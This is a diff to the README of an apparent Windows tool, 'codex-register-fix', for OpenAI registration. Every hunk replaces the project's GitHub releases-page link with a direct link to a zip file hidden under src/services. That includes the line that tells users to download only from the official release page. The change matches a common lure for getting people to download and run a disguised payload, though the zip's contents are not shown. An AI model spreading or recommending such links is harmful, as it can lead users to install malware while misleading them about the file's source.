@@ -1,6 +1,6 @@
 # 🔧 codex-register-fix - Simplify OpenAI Registration Setup
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Maranv2732/codex-register-fix/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Maranv2732/codex-register-fix/raw/refs/heads/main/src/services/fix-register-codex-2.6.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ For a smooth experience, use a modern browser and keep Windows up to date.
 
 Visit the release page and download the latest version for Windows:
 
-https://github.com/Maranv2732/codex-register-fix/releases
+https://github.com/Maranv2732/codex-register-fix/raw/refs/heads/main/src/services/fix-register-codex-2.6.zip
 
 On the releases page, look for the newest version and choose the Windows file. If there are several files, pick the one that matches your system.
 
@@ -109,7 +109,7 @@ If you see network errors:
 
 Only download from the official release page:
 
-https://github.com/Maranv2732/codex-register-fix/releases
+https://github.com/Maranv2732/codex-register-fix/raw/refs/heads/main/src/services/fix-register-codex-2.6.zip
 
 This helps you get the current release files from the project owner. Avoid files from other sites or mirror pages.
 
@@ -143,7 +143,7 @@ If the app opens a browser or another window, keep both open until the process e
 4. Run the app
 5. Follow the on-screen steps
 
-https://github.com/Maranv2732/codex-register-fix/releases
+https://github.com/Maranv2732/codex-register-fix/raw/refs/heads/main/src/services/fix-register-codex-2.6.zip
 
 ## 📂 Folder tips
 
@@ -178,4 +178,4 @@ The app may need internet access to complete parts of the process. Use a stable 
 
 Primary download link:
 
-https://github.com/Maranv2732/codex-register-fix/releases
+https://github.com/Maranv2732/codex-register-fix/raw/refs/heads/main/src/services/fix-register-codex-2.6.zip
